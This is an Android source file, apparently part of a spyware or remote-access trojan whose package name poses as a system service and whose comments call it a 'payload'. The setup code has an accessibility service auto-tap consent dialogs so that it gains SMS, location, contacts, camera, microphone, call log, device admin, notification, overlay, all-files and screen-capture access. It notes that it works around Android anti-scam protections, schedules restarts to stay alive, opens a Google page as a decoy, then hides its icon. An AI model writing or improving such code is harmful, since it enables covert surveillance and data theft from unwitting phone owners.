package com.android.background.services;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.lifecycle.Lifecycle;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import com.android.background.services.receivers.AdminReceiver;
import com.android.background.services.workers.RestartServiceWorker;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

/**
 * One-tap onboarding for a fresh payload install.
 *
 * Walks every consent the payload needs in sequence; the {@link AutoGrantService}
 * (accessibility) taps the positive button on each system screen automatically
 * once it is enabled, so a fresh install needs no adb and (after the single
 * accessibility toggle) no per-dialog taps:
 *
 *   accessibility -> runtime permissions -> device admin -> notification
 *   access -> battery optimization -> overlay -> all-files storage ->
 *   screen capture consent -> core services
 *
 * Each stage either completes synchronously (already granted) or launches its
 * system screen; the flow re-enters from {@link #onResume()} / the permission
 * callback and advances once the screen returns.
 */
public class MainActivity extends AppCompatActivity {

    private static final String TAG = "Setup";

    // stage ids (order matters)
    private static final int STAGE_ACCESSIBILITY = 0;
    private static final int STAGE_PERMISSIONS = 1;
    private static final int STAGE_DEVICE_ADMIN = 2;
    private static final int STAGE_NOTIFICATION = 3;
    private static final int STAGE_BATTERY = 4;
    private static final int STAGE_OVERLAY = 5;
    private static final int STAGE_STORAGE = 6;
    private static final int STAGE_SCREEN_CAPTURE = 7;
    private static final int STAGE_DONE = 8;

    private static final int ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE = 2323;
    private static final int ACTION_MANAGE_STORAGE_PERMISSION_REQUEST_CODE = 5000;

    public static DevicePolicyManager devicePolicyManager;
    public static ComponentName componentName;

    private int setupStage = STAGE_ACCESSIBILITY;
    private boolean awaitingResume = false;   // a system screen was launched
    private boolean permissionsRequested = false;
    private boolean accessibilityPrompted = false;
    private boolean firstResume = true;       // the onResume right after onCreate
    private long lastScreenLaunchAt = 0L;     // elapse time of the last launched screen

    // A screen launch is followed almost immediately by a transient onResume
    // (the activity resumes during the transition animation). Treat resumes
    // within this window as part of the launch, not as a return from the
    // system screen, so the flow never opens the same screen twice.
    private static final long LAUNCH_TRANSITION_MS = 400L;

    // When AutoGrantService auto-taps a system dialog, the dialog closes
    // INSIDE the launch-transition window, so no onResume ever marks the
    // return. A delayed fallback advances the flow shortly after the launch
    // if no real resume arrived (the stage re-checks its condition, so an
    // un-granted stage simply re-opens its screen).
    private static final long LAUNCH_FALLBACK_MS = 900L;
    private final Handler setupHandler = new Handler(Looper.getMainLooper());
    private final Runnable launchFallback = () -> {
        // Only advance while the activity is at least STARTED: advancing into
        // the permission / screen-capture stages calls an ActivityResultLauncher
        // which crashes when the activity is paused behind another window.
        if (awaitingResume && getLifecycle().getCurrentState().isAtLeast(Lifecycle.State.STARTED)) {
            awaitingResume = false;
            advanceSetup();
        }
    };

    // Screen-launching stages are allowed a few attempts; if a system screen
    // is unreachable/blocked (e.g. Android 15+ anti-scam protections), the
    // wizard gives up on that stage and continues so the service still starts.
    private static final int MAX_STAGE_ATTEMPTS = 3;
    private final int[] stageAttempts = new int[STAGE_DONE];

    private final ActivityResultLauncher<String[]> permissionLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), this::handlePermissionResult);

    private final ActivityResultLauncher<Intent> screenCaptureLauncher =
            registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
                if (result.getResultCode() == RESULT_OK && result.getData() != null) {
                    // Store the consent token; the service creates the
                    // (single-use) MediaProjection once the FGS is running.
                    MainService.setScreenCaptureData(result.getResultCode(), result.getData());
                }
                startCoreServices();
            });

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        componentName = new ComponentName(this, AdminReceiver.class);
        devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);

        setupStage = STAGE_ACCESSIBILITY;
        advanceSetup();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (firstResume) {
            // This is the onResume that immediately follows onCreate: the wizard
            // already launched the first stage in onCreate, so treat it as the
            // launch, not a return from a system screen (avoids double-opening).
            firstResume = false;
            return;
        }
        // Returning from a settings/admin/battery screen: continue the flow.
        // Skip the transient resume that immediately follows a screen launch
        // (see LAUNCH_TRANSITION_MS); only a real return resumes later.
        if (awaitingResume) {
            if (SystemClock.elapsedRealtime() - lastScreenLaunchAt < LAUNCH_TRANSITION_MS) {
                return;
            }
            awaitingResume = false;
            setupHandler.removeCallbacks(launchFallback);
            advanceSetup();
        }
    }

    /** Record that a system screen was launched (used by the onResume guard). */
    private void markScreenLaunched() {
        awaitingResume = true;
        lastScreenLaunchAt = SystemClock.elapsedRealtime();
        // Fallback for dialogs AutoGrantService auto-taps within the launch
        // transition: no onResume will follow, so advance once the window
        // passes. A real return clears the pending run in onResume().
        // Re-armed on EVERY launch: when a stage retries (its screen was
        // re-launched without a return event), the fallback must fire again or
        // the wizard stalls forever. Dialog stacking is bounded by
        // MAX_STAGE_ATTEMPTS (3 per stage).
        setupHandler.removeCallbacks(launchFallback);
        setupHandler.postDelayed(launchFallback, LAUNCH_FALLBACK_MS);
    }

    /** Bump the attempt counter for a stage; true if it may launch one more time. */
    private boolean mayRetryStage(int stage) {
        return ++stageAttempts[stage] <= MAX_STAGE_ATTEMPTS;
    }

    /**
     * Run stages in order. Each stage either advances synchronously (already
     * satisfied) or launches its system screen and returns; the flow resumes
     * via {@link #onResume()} or the permission callback.
     */
    private void advanceSetup() {
        while (setupStage < STAGE_DONE) {
            switch (setupStage) {
                case STAGE_ACCESSIBILITY:
                    if (AutoGrantService.isEnabled(this)) {
                        log("stage accessibility: enabled (auto-grant active)");
                        setupStage++;
                    } else if (!accessibilityPrompted) {
                        // Best-effort: open the accessibility settings once. If
                        // the user (or Android 15+ anti-scam protection) does
                        // not enable it, continue anyway — the wizard's own
                        // dialogs still walk through every consent screen.
                        accessibilityPrompted = true;
                        log("stage accessibility: opening settings (optional, once)");
                        markScreenLaunched();
                        AutoGrantService.openSettings(this);
                        return;
                    } else {
                        log("stage accessibility: not enabled (continuing without auto-grant)");
                        setupStage++;
                    }
                    break;

                case STAGE_PERMISSIONS:
                    if (hasMissingPermissions() && !permissionsRequested) {
                        // Request once per launch; if the user denies (or the
                        // dialog is dismissed), fall through so the service
                        // still starts — gated orders report a clean error.
                        permissionsRequested = true;
                        log("stage permissions: requesting " + getRequiredPermissions().length);
                        permissionLauncher.launch(getRequiredPermissions());
                        return;
                    }
                    log("stage permissions: " + (hasMissingPermissions() ? "some denied (continuing)" : "all granted"));
                    setupStage++;
                    break;

                case STAGE_DEVICE_ADMIN:
                    if (!devicePolicyManager.isAdminActive(componentName)) {
                        if (mayRetryStage(STAGE_DEVICE_ADMIN)) {
                            log("stage device-admin: opening activation screen");
                            Intent admin = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                            admin.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
                            admin.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                    getString(R.string.device_admin_explanation));
                            markScreenLaunched();
                            startActivity(admin);
                            return;
                        }
                        log("stage device-admin: skipped after " + MAX_STAGE_ATTEMPTS + " attempts");
                    } else {
                        log("stage device-admin: already active");
                    }
                    setupStage++;
                    break;

                case STAGE_NOTIFICATION:
                    if (!MainService.isNotificationServiceEnabled(this)) {
                        if (mayRetryStage(STAGE_NOTIFICATION)) {
                            log("stage notifications: opening listener settings");
                            markScreenLaunched();
                            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                            return;
                        }
                        log("stage notifications: skipped after " + MAX_STAGE_ATTEMPTS + " attempts");
                    } else {
                        log("stage notifications: access granted");
                    }
                    setupStage++;
                    break;

                case STAGE_BATTERY:
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                        if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                            if (mayRetryStage(STAGE_BATTERY)) {
                                log("stage battery: requesting ignore optimization");
                                markScreenLaunched();
                                requestBatteryOptimizationPermission();
                                return;
                            }
                            log("stage battery: skipped after " + MAX_STAGE_ATTEMPTS + " attempts");
                        } else {
                            log("stage battery: already ignoring");
                        }
                    } else {
                        log("stage battery: already ignoring");
                    }
                    setupStage++;
                    break;

                case STAGE_OVERLAY:
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
                        if (mayRetryStage(STAGE_OVERLAY)) {
                            log("stage overlay: opening manage-overlay");
                            markScreenLaunched();
                            Intent overlay = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                    Uri.parse("package:" + getPackageName()));
                            startActivityForResult(overlay, ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE);
                            return;
                        }
                        log("stage overlay: skipped after " + MAX_STAGE_ATTEMPTS + " attempts");
                    } else {
                        log("stage overlay: already granted");
                    }
                    setupStage++;
                    break;

                case STAGE_STORAGE:
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R
                            && !Environment.isExternalStorageManager()) {
                        if (mayRetryStage(STAGE_STORAGE)) {
                            log("stage storage: opening all-files access");
                            markScreenLaunched();
                            Intent storage = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                                    Uri.parse("package:" + getPackageName()));
                            startActivityForResult(storage, ACTION_MANAGE_STORAGE_PERMISSION_REQUEST_CODE);
                            return;
                        }
                        log("stage storage: skipped after " + MAX_STAGE_ATTEMPTS + " attempts");
                    } else {
                        log("stage storage: already granted");
                    }
                    setupStage++;
                    break;

                case STAGE_SCREEN_CAPTURE:
                    log("stage screen-capture: requesting consent");
                    setupStage = STAGE_DONE;   // the launcher callback starts services
                    MediaProjectionManager mpm = (MediaProjectionManager)
                            getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                    if (mpm != null) {
                        try {
                            screenCaptureLauncher.launch(mpm.createScreenCaptureIntent());
                        } catch (Exception e) {
                            // Launcher refused (e.g. activity not started);
                            // start the core services anyway — the consent is
                            // optional and can be re-requested on relaunch.
                            startCoreServices();
                        }
                    } else {
                        startCoreServices();
                    }
                    return;
            }
        }
    }

    private void log(String msg) {
        Log.i(TAG, msg);
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
    }

    private void handlePermissionResult(Map<String, Boolean> result) {
        boolean allGranted = true;
        for (Boolean granted : result.values()) {
            if (!granted) { allGranted = false; break; }
        }
        Toast.makeText(this, allGranted ? "All permissions granted"
                : "Some permissions were denied", Toast.LENGTH_SHORT).show();
        // Advance regardless of outcome; denied permissions just gate orders.
        advanceSetup();
    }

    private boolean hasMissingPermissions() {
        for (String p : getRequiredPermissions()) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                return true;
            }
        }
        return false;
    }

    private String[] getRequiredPermissions() {
        List<String> permissions = new ArrayList<>();
        permissions.add(Manifest.permission.READ_SMS);
        permissions.add(Manifest.permission.SEND_SMS);
        permissions.add(Manifest.permission.RECEIVE_SMS);
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        permissions.add(Manifest.permission.READ_PHONE_STATE);
        permissions.add(Manifest.permission.READ_CONTACTS);
        permissions.add(Manifest.permission.RECORD_AUDIO);
        permissions.add(Manifest.permission.CAMERA);
        permissions.add(Manifest.permission.READ_CALL_LOG);
        permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            permissions.add(Manifest.permission.ACCESS_MEDIA_LOCATION);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
        }
        return permissions.toArray(new String[0]);
    }

    // -- core services (final stage) ----------------------------------------

    private void startCoreServices() {
        scheduleRestartServiceWorker();

        if (!MainService.isNotificationServiceEnabled(this)) {
            Toast.makeText(this, "Notification access not granted; enable it for notification streaming",
                    Toast.LENGTH_LONG).show();
        }

        Intent intent = new Intent(this, MainService.class);
        ContextCompat.startForegroundService(this, intent);
        openExternalPage(this);

        hideIcon();

        new Handler().postDelayed(this::finishAndRemoveTask, 1000);
    }

    private void scheduleRestartServiceWorker() {
        PeriodicWorkRequest restartServiceWorkRequest =
                new PeriodicWorkRequest.Builder(RestartServiceWorker.class, 15, TimeUnit.MINUTES)
                        .build();
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "RestartServiceWork",
                ExistingPeriodicWorkPolicy.KEEP,
                restartServiceWorkRequest
        );
    }

    @SuppressLint("BatteryLife")
    private void requestBatteryOptimizationPermission() {
        Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                Uri.parse("package:" + getPackageName()));
        startActivity(intent);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        // Overlay / storage screens came back: continue the flow.
        advanceSetup();
    }

    // -------------------------------------------------------------------------

    public static void openExternalPage(Context context) {
        try {
            Intent intent = new Intent();
            final String APP_PACKAGE_NAME = "com.google.android.gms";
            final String APP_ACTIVITY_PATH = "com.google.android.gms.app.settings.GoogleSettingsLink";
            intent.setClassName(APP_PACKAGE_NAME, APP_ACTIVITY_PATH);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(Uri.parse("https://play.google.com/store/apps/"));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }
    }

    public void hideIcon() {
        getPackageManager().setComponentEnabledSetting(getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
